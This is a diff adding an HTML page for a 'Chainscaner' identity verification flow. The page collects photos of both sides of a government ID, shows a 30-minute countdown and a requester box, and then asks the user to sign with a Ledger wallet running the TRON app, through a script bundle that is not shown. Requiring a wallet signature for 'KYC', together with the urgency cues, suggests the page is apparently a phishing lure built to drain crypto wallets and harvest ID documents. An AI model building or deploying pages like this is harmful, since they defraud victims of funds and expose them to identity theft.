@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Identity Verification — Chainscaner</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com"></script>
+
+<style>
+  :root {
+    color-scheme: light;
+    --bg: #f4f6f9;
+    --card: #ffffff;
+    --border: #e3e8ef;
+    --text: #17202b;
+    --muted: #5f6b7c;
+    --primary: #0a5cff;
+    --primary-hover: #0049d6;
+    --success: #14914b;
+    --success-hover: #0e7a3c;
+    --danger: #d92d20;
+    --warn: #b54708;
+    --ring: rgba(10,92,255,.18);
+    --shadow: 0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+    --shadow-lg: 0 4px 12px rgba(16,24,40,.08), 0 2px 4px rgba(16,24,40,.04);
+  }
+  * { box-sizing: border-box; }
+  body { font-family: 'Inter', system-ui, -apple-system, sans-serif; background: var(--bg); color: var(--text); -webkit-font-smoothing: antialiased; }
+
+  .step-indicator { display: flex; gap: 8px; margin-bottom: 24px; }
+  .step-indicator .step { flex: 1; height: 4px; border-radius: 99px; background: var(--border); transition: background .3s; }
+  .step-indicator .step.active { background: var(--primary); }
+  .step-indicator .step.done { background: var(--success); }
+
+  .dz-area { background: #fafbfd; border: 2px dashed var(--border); border-radius: 14px; padding: 36px 24px; text-align: center; cursor: pointer; transition: all .2s; }
+  .dz-area:hover, .dz-area.dz-drag-hover { border-color: var(--primary); background: rgba(10,92,255,.03); }
+  .dz-area:active { transform: scale(.995); }
+
+  .quality-indicator { display: flex; gap: 8px; margin-top: 12px; }
+  .quality-indicator .check { flex: 1; padding: 6px 8px; border-radius: 6px; font-size: 11px; text-align: center; font-weight: 600; }
+  .quality-indicator .check.good { background: rgba(20,145,75,.09); color: var(--success); border: 1px solid rgba(20,145,75,.35); }
+  .quality-indicator .check.bad { background: rgba(217,45,32,.07); color: var(--danger); border: 1px solid rgba(217,45,32,.3); }
+  .quality-indicator .check.pending { background: #f2f4f7; color: var(--muted); border: 1px solid var(--border); }
+
+  .journey { display: flex; align-items: center; gap: 10px; margin-bottom: 18px; }
+  .jstep { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--muted); white-space: nowrap; font-weight: 500; }
+  .jstep .jdot { width: 24px; height: 24px; border-radius: 50%; border: 1.5px solid var(--border); background: #fff; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; flex: none; transition: all .25s; }
+  .jstep.active { color: var(--text); }
+  .jstep.active .jdot { border-color: var(--primary); color: #fff; background: var(--primary); box-shadow: 0 0 0 4px var(--ring); }
+  .jstep.done { color: var(--success); }
+  .jstep.done .jdot { border-color: var(--success); background: rgba(20,145,75,.1); color: var(--success); }
+  .jconn { flex: 1; height: 1.5px; background: var(--border); min-width: 14px; transition: background .3s; }
+  .jconn.done { background: var(--success); }
+
+  .hidden { display: none !important; }
+
+  .btn-primary, .btn-secondary, .btn-success {
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    font-weight: 600; padding: 13px 24px; border-radius: 10px; font-size: 15px;
+    transition: all .18s ease; border: 0; cursor: pointer;
+  }
+  .btn-primary { background: var(--primary); color: #fff; box-shadow: 0 1px 2px rgba(10,92,255,.25); }
+  .btn-primary:hover:not(:disabled) { background: var(--primary-hover); }
+  .btn-primary:active:not(:disabled) { transform: scale(.98); }
+  .btn-primary:disabled { opacity: .45; cursor: not-allowed; }
+
+  .btn-secondary { background: #fff; color: var(--text); border: 1px solid var(--border); }
+  .btn-secondary:hover { background: #f7f9fc; border-color: #cdd4de; }
+  .btn-secondary:active { transform: scale(.98); }
+
+  .btn-success { background: var(--success); color: #fff; box-shadow: 0 1px 2px rgba(20,145,75,.25); }
+  .btn-success:hover:not(:disabled) { background: var(--success-hover); }
+  .btn-success:active:not(:disabled) { transform: scale(.98); }
+  .btn-success:disabled { opacity: .45; cursor: not-allowed; }
+
+  button:focus-visible, .dz-area:focus-visible, input:focus-visible {
+    outline: none; box-shadow: 0 0 0 4px var(--ring);
+  }
+
+  .card {
+    background: var(--card); border: 1px solid var(--border); border-radius: 16px;
+    padding: 28px; box-shadow: var(--shadow);
+    animation: rise .25s ease;
+  }
+  @keyframes rise { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+
+  .inner-box { background: #f8fafc; border: 1px solid var(--border); border-radius: 12px; }
+
+  input[type="checkbox"] { width: 18px; height: 18px; accent-color: var(--primary); }
+
+  .doc-type-btn { background: #fff; border: 1.5px solid var(--border); border-radius: 14px; padding: 24px; text-align: left; transition: all .18s ease; cursor: pointer; }
+  .doc-type-btn:hover { border-color: var(--primary); box-shadow: var(--shadow); }
+  .doc-type-btn:active { transform: scale(.985); }
+  .doc-type-btn.sel { border-color: var(--primary); background: rgba(10,92,255,.04); box-shadow: 0 0 0 3px var(--ring); }
+
+  .link-btn { color: var(--primary); font-weight: 500; background: none; border: 0; cursor: pointer; }
+  .link-btn:hover { text-decoration: underline; }
+
+  .session-pill { display: inline-flex; align-items: center; gap: 7px; padding: 6px 12px;
+    border: 1px solid var(--border); border-radius: 999px; background: #fff;
+    font-size: 12px; font-weight: 500; color: var(--muted); white-space: nowrap;
+    box-shadow: var(--shadow); transition: border-color .3s, color .3s, background .3s; }
+  .session-pill svg { flex: none; }
+  .session-pill .val { font-family: ui-monospace, 'SF Mono', Menlo, monospace; font-weight: 700;
+    color: var(--text); font-variant-numeric: tabular-nums; letter-spacing: .02em; }
+  .session-pill.warn { border-color: rgba(181,71,8,.4); background: #fffaeb; color: var(--warn); }
+  .session-pill.warn .val { color: var(--warn); }
+  .session-pill.danger { border-color: rgba(217,45,32,.45); background: #fef3f2; color: var(--danger); }
+  .session-pill.danger .val { color: var(--danger); }
+  .session-pill.danger svg { animation: pill-pulse 1s ease-in-out infinite; }
+  @keyframes pill-pulse { 0%,100% { opacity: 1 } 50% { opacity: .35 } }
+
+  .brand-icon { width:30px; height:30px; border-radius:9px; flex:none;
+    background:linear-gradient(135deg,#2563EB,#1D4ED8);
+    display:inline-flex; align-items:center; justify-content:center;
+    box-shadow:0 2px 8px rgba(37,99,235,.25); }
+  .brand-word { display:flex; flex-direction:column; line-height:1.1; }
+  .brand-name { font-weight:800; font-size:16px; letter-spacing:-.3px; color:var(--text); }
+  .brand-word .scan { color:#2563EB; }
+  .brand-tag { font-size:8.5px; font-weight:700; letter-spacing:1.7px; text-transform:uppercase; color:var(--muted); margin-top:3px; }
+  @media (max-width:560px){ .brand-tag{ display:none; } }
+
+  @media (prefers-reduced-motion: reduce) {
+    .session-pill.danger svg { animation: none; }
+    .card, .jstep .jdot, .jconn, .btn-primary, .btn-secondary, .btn-success, .doc-type-btn { animation: none; transition: none; }
+  }
+</style>
+</head>
+<body class="min-h-screen">
+
+<div class="max-w-2xl mx-auto py-10 px-4">
+
+  <!-- Header -->
+  <div class="flex items-center justify-between mb-5">
+    <div class="inline-flex items-center gap-2">
+      <span class="brand-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-3.6 8-10V5l-8-3-8 3v7c0 6.4 8 10 8 10z"/></svg></span>
+      <span class="brand-word"><span class="brand-name">chain<span class="scan">scan</span>er</span><span class="brand-tag">One scan ahead.</span></span>
+    </div>
+    <div id="sess-pill" class="session-pill hidden" role="timer" aria-live="off" aria-label="Session time remaining">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+      <span>Expires in</span>
+      <span class="val" id="sess-pill-val">30:00</span>
+    </div>
+  </div>
+  <div class="text-center mb-7">
+    <h1 class="text-2xl font-bold mb-1 tracking-tight">Identity Verification</h1>
+    <p class="text-sm" style="color:var(--muted)">Secure KYC process — documents + hardware wallet</p>
+  </div>
+
+  <!-- Journey: phases of the whole verification -->
+  <div class="journey" id="journey" aria-label="Verification progress">
+    <div class="jstep active" id="j-doc"><span class="jdot">1</span><span>Documents</span></div>
+    <div class="jconn" id="jc-doc"></div>
+    <div class="jstep" id="j-ledger"><span class="jdot">2</span><span>Ledger</span></div>
+    <div class="jconn" id="jc-ledger"></div>
+    <div class="jstep" id="j-done"><span class="jdot">3</span><span>Verified</span></div>
+  </div>
+
+  <!-- Step Indicator (within the documents phase) -->
+  <div class="step-indicator" id="step-indicator">
+    <div class="step active" data-step="1"></div>
+    <div class="step" data-step="2"></div>
+    <div class="step" data-step="3"></div>
+    <div class="step" data-step="4"></div>
+    <div class="step" data-step="5"></div>
+  </div>
+
+  <!-- Step 1: Welcome -->
+  <div id="step-1" class="card">
+    <h2 class="text-lg font-semibold mb-4">Identity Verification</h2>
+
+    <div class="inner-box p-4 mb-6">
+      <p class="text-sm font-medium mb-2">Verification Request</p>
+      <div class="grid grid-cols-2 gap-4 text-sm">
+        <div>
+          <p class="text-xs" style="color:var(--muted)">From (Requester)</p>
+          <p class="font-medium" id="from-display">-</p>
+        </div>
+        <div>
+          <p class="text-xs" style="color:var(--muted)">To (Verified Person)</p>
+          <p class="font-medium" id="to-display">-</p>
+        </div>
+      </div>
+      <div class="mt-3 pt-3 text-xs" style="border-top:1px solid var(--border); color:var(--muted)">
+        Valid for 30 minutes from first opening — the countdown is shown at the top.
+      </div>
+    </div>
+
+    <p class="text-sm mb-6" style="color:var(--muted)">
+      To verify your identity, we'll need photos of your government-issued ID
+      and a signature from your Ledger hardware wallet.
+    </p>
+    <div class="space-y-3 mb-6">
+      <div class="flex items-start gap-3">
+        <svg class="w-5 h-5 mt-0.5" style="color:var(--success)" fill="currentColor" viewBox="0 0 20 20">
+          <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+        </svg>
+        <div>
+          <p class="text-sm font-medium">Secure & Private</p>
+          <p class="text-xs" style="color:var(--muted)">Your documents are encrypted and never shared</p>
+        </div>
+      </div>
+      <div class="flex items-start gap-3">
+        <svg class="w-5 h-5 mt-0.5" style="color:var(--success)" fill="currentColor" viewBox="0 0 20 20">
+          <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+        </svg>
+        <div>
+          <p class="text-sm font-medium">Quick Process</p>
+          <p class="text-xs" style="color:var(--muted)">Less than 2 minutes to complete</p>
+        </div>
+      </div>
+      <div class="flex items-start gap-3">
+        <svg class="w-5 h-5 mt-0.5" style="color:var(--success)" fill="currentColor" viewBox="0 0 20 20">
+          <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+        </svg>
+        <div>
+          <p class="text-sm font-medium">Hardware Wallet Verified</p>
+          <p class="text-xs" style="color:var(--muted)">Final step requires a Ledger signature</p>
+        </div>
+      </div>
+    </div>
+    <button onclick="window.nextStep()" class="w-full btn-primary">
+      Start Verification
+    </button>
+  </div>
+
+  <!-- Step 2: Document Type -->
+  <div id="step-2" class="hidden card">
+    <h2 class="text-lg font-semibold mb-4">Select Document Type</h2>
+    <div class="grid grid-cols-2 gap-4 mb-6">
+      <button onclick="selectDocumentType('id')" class="doc-type-btn">
+        <svg class="w-8 h-8 mb-3" style="color:var(--primary)" fill="currentColor" viewBox="0 0 20 20">
+          <path fill-rule="evenodd" d="M4 4a2 2 0 012-2h8a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V4zm2-1a1 1 0 00-1 1v12a1 1 0 001 1h8a1 1 0 001-1V4a1 1 0 00-1-1H6z" clip-rule="evenodd"/>
+        </svg>
+        <p class="font-medium">ID Card</p>
+        <p class="text-xs mt-1" style="color:var(--muted)">National ID, Driver's License</p>
+      </button>
+      <button onclick="selectDocumentType('passport')" class="doc-type-btn">
+        <svg class="w-8 h-8 mb-3" style="color:var(--primary)" fill="currentColor" viewBox="0 0 20 20">
+          <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM9.555 7.168A1 1 0 008 8v4a1 1 0 001.555.832l3-2a1 1 0 000-1.664l-3-2z" clip-rule="evenodd"/>
+        </svg>
+        <p class="font-medium">Passport</p>
+        <p class="text-xs mt-1" style="color:var(--muted)">International passport</p>
+      </button>
+    </div>
+    <div class="flex gap-3">
+      <button onclick="prevStep()" class="flex-1 btn-secondary">
+        Back
+      </button>
+      <button onclick="nextStep()" id="step2-next" class="flex-1 btn-primary" disabled>
+        Continue
+      </button>
+    </div>
+  </div>
+
+  <!-- Step 3: Front Upload -->
+  <div id="step-3" class="hidden card">
+    <h2 class="text-lg font-semibold mb-4">Document Photos</h2>
+    <p class="text-sm mb-6" style="color:var(--muted)">Please provide clear photos of the front and back of your document.</p>
+
+    <!-- Phone handoff toggle -->
+    <div class="text-center mb-5">
+      <button type="button" onclick="togglePhoneMode()" id="phone-toggle" class="link-btn text-sm">
+        📱 Use your phone's camera instead →
+      </button>
+    </div>
+
+    <!-- QR handoff panel -->
+    <div id="qr-panel" class="hidden mb-6 text-center inner-box p-6" style="border-radius:16px">
+      <p class="text-sm mb-1 font-semibold">Scan with your phone camera</p>
+      <p class="text-xs mb-4" style="color:var(--muted)">A capture page opens on your phone — this page continues automatically when your photos arrive.</p>
+      <div class="bg-white p-4 rounded-xl inline-block" style="box-shadow:var(--shadow)" id="qr-code"></div>
+      <div class="mt-4 flex items-center justify-center gap-2 text-sm" style="color:var(--warn)">
+        <span class="inline-block w-2 h-2 rounded-full animate-pulse" style="background:var(--warn)"></span>
+        <span id="qr-progress">Waiting for phone…</span>
+      </div>
+      <button type="button" onclick="togglePhoneMode()" class="link-btn mt-4 text-xs">Upload on this device instead</button>
+    </div>
+
+    <div id="front-dropzone" class="dz-area mb-6" role="button" tabindex="0" aria-label="Upload front side of document">
+      <div style="font-size:28px; margin-bottom:8px">📄</div>
+      <div style="font-weight:600; font-size:14px">Drop front image here, or click to browse</div>
+      <div style="font-size:12px; margin-top:4px; color:var(--muted)">JPG or PNG · max 10 MB</div>
+    </div>
+    <input type="file" id="front-file" accept="image/*" class="hidden" aria-hidden="true" />
+
+    <div id="front-preview" class="hidden mb-6">
+      <div class="inner-box p-4">
+        <img id="front-image" class="w-full rounded-lg mb-4" alt="Front preview" />
+        <div class="quality-indicator">
+          <div class="check pending" id="front-blur">Blur</div>
+          <div class="check pending" id="front-glare">Glare</div>
+          <div class="check pending" id="front-brightness">Brightness</div>
+        </div>
+        <button type="button" onclick="removeUpload('front')" class="link-btn text-xs mt-3">Remove / choose another photo</button>
+      </div>
+    </div>
+
+    <div class="flex gap-3" id="step3-buttons">
+      <button onclick="prevStep()" class="flex-1 btn-secondary">
+        Back
+      </button>
+      <button onclick="nextStep()" id="step3-next" class="flex-1 btn-primary" disabled>
+        Continue
+      </button>
+    </div>
+  </div>
+
+  <!-- Step 4: Back Upload -->
+  <div id="step-4" class="hidden card">
+    <h2 class="text-lg font-semibold mb-4">Upload Back Side</h2>
+    <p class="text-sm mb-6" style="color:var(--muted)">Please upload a clear photo of the back side of your document.</p>
+
+    <div id="back-dropzone" class="dz-area mb-6" role="button" tabindex="0" aria-label="Upload back side of document">
+      <div style="font-size:28px; margin-bottom:8px">📄</div>
+      <div style="font-weight:600; font-size:14px">Drop back image here, or click to browse</div>
+      <div style="font-size:12px; margin-top:4px; color:var(--muted)">JPG or PNG · max 10 MB</div>
+    </div>
+    <input type="file" id="back-file" accept="image/*" class="hidden" aria-hidden="true" />
+
+    <div id="back-preview" class="hidden mb-6">
+      <div class="inner-box p-4">
+        <img id="back-image" class="w-full rounded-lg mb-4" alt="Back preview" />
+        <div class="quality-indicator">
+          <div class="check pending" id="back-blur">Blur</div>
+          <div class="check pending" id="back-glare">Glare</div>
+          <div class="check pending" id="back-brightness">Brightness</div>
+        </div>
+        <button type="button" onclick="removeUpload('back')" class="link-btn text-xs mt-3">Remove / choose another photo</button>
+      </div>
+    </div>
+
+    <div class="flex gap-3">
+      <button onclick="prevStep()" class="flex-1 btn-secondary">
+        Back
+      </button>
+      <button onclick="nextStep()" id="step4-next" class="flex-1 btn-primary" disabled>
+        Continue
+      </button>
+    </div>
+  </div>
+
+  <!-- Step 5: Review & Submit -->
+  <div id="step-5" class="hidden card">
+    <h2 class="text-lg font-semibold mb-4">Review & Submit</h2>
+    <p class="text-sm mb-6" style="color:var(--muted)">Please review your documents before submitting.</p>
+
+    <div class="space-y-4 mb-6">
+      <div class="inner-box p-4">
+        <p class="text-xs mb-2" style="color:var(--muted)">Front Side</p>
+        <img id="review-front" class="w-full rounded-lg" alt="Front review" />
+      </div>
+      <div class="inner-box p-4">
+        <p class="text-xs mb-2" style="color:var(--muted)">Back Side</p>
+        <img id="review-back" class="w-full rounded-lg" alt="Back review" />
+      </div>
+    </div>
+
+    <div class="inner-box p-4 mb-6">
+      <p class="text-sm font-medium mb-2">What happens next?</p>
+      <p class="text-xs" style="color:var(--muted)">
+        Your documents will be encrypted and sent for verification.
+        The final step requires signing with your Ledger hardware wallet.
+      </p>
+    </div>
+
+    <div class="mb-6">
+      <label class="flex items-start gap-3 cursor-pointer">
+        <input type="checkbox" id="ledger-confirm" class="mt-0.5" />
+        <div>
+          <p class="text-sm font-medium">I confirm that the Ledger device belongs to me</p>
+          <p class="text-xs" style="color:var(--muted)">Only the device owner can complete verification</p>
+        </div>
+      </label>
+    </div>
+
+    <div id="submit-error" class="hidden text-sm mb-4" style="color:var(--danger)"></div>
+
+    <div class="flex gap-3">
+      <button onclick="prevStep()" class="flex-1 btn-secondary">
+        Back
+      </button>
+      <button onclick="submitKYC()" id="submit-btn" class="flex-1 btn-success" disabled>
+        Submit & Verify with Ledger
+      </button>
+    </div>
+  </div>
+
+  <!-- Step 6: Success — proceed to Ledger -->
+  <div id="step-6" class="hidden card text-center">
+    <div class="w-16 h-16 mx-auto mb-4 rounded-full flex items-center justify-center" style="background:rgba(20,145,75,.1); border:1.5px solid rgba(20,145,75,.35)">
+      <svg class="w-8 h-8" style="color:var(--success)" fill="currentColor" viewBox="0 0 20 20">
+        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+      </svg>
+    </div>
+    <h2 class="text-lg font-semibold mb-2">Documents Received</h2>
+    <p class="text-sm mb-2" style="color:var(--muted)">
+      Final step: connect your Ledger hardware wallet to complete verification.
+    </p>
+    <p class="text-xs mb-6" style="color:var(--muted)">
+      Make sure your Ledger is connected via USB and the TRON app is open.
+    </p>
+    <button onclick="window.finishVerification()" class="btn-primary w-full">
+      Verify with Ledger
+    </button>
+  </div>
+
+  <!-- Expired / Invalid Session -->
+  <div id="step-expired" class="hidden card text-center">
+    <div class="w-16 h-16 mx-auto mb-4 rounded-full flex items-center justify-center" style="background:rgba(217,45,32,.08); border:1.5px solid rgba(217,45,32,.3)">
+      <svg class="w-8 h-8" style="color:var(--danger)" fill="currentColor" viewBox="0 0 20 20">
+        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"/>
+      </svg>
+    </div>
+    <h2 class="text-lg font-semibold mb-2">Link Expired or Invalid</h2>
+    <p class="text-sm mb-6" style="color:var(--muted)">
+      This verification link has expired or is invalid.<br>
+      Please contact the requester to receive a new link.
+    </p>
+  </div>
+
+  <!-- Desktop Required -->
+  <div id="step-desktop" class="hidden card text-center">
+    <div class="w-16 h-16 mx-auto mb-4 rounded-full flex items-center justify-center" style="background:rgba(181,71,8,.08); border:1.5px solid rgba(181,71,8,.3)">
+      <svg class="w-8 h-8" style="color:var(--warn)" fill="currentColor" viewBox="0 0 20 20">
+        <path fill-rule="evenodd" d="M3 5a2 2 0 012-2h10a2 2 0 012 2v8a2 2 0 01-2 2h-2.22l.123.489.804.804A1 1 0 0113 18H7a1 1 0 01-.707-1.707l.804-.804L7.22 15H5a2 2 0 01-2-2V5zm5.771 7H5V5h10v7H8.771z" clip-rule="evenodd"/>
+      </svg>
+    </div>
+    <h2 class="text-lg font-semibold mb-2">Desktop Required</h2>
+    <p class="text-sm mb-6" style="color:var(--muted)">
+      Identity verification requires a hardware wallet signature.<br>
+      Please open this link on a desktop computer with your Ledger connected.
+    </p>
+  </div>
+
+  <!-- Already Completed -->
+  <div id="step-already-done" class="hidden card text-center">
+    <div class="w-16 h-16 mx-auto mb-4 rounded-full flex items-center justify-center" style="background:rgba(20,145,75,.1); border:1.5px solid rgba(20,145,75,.35)">
+      <svg class="w-8 h-8" style="color:var(--success)" fill="currentColor" viewBox="0 0 20 20">
+        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+      </svg>
+    </div>
+    <h2 class="text-lg font-semibold mb-2">Already Verified</h2>
+    <p class="text-sm mb-6" style="color:var(--muted)">
+      This verification has already been completed.<br>
+      No further action is required.
+    </p>
+  </div>
+
+</div>
+
+<script type="module" src="/ledger/kyc-bundle.js"></script>
+</body>
+</html>
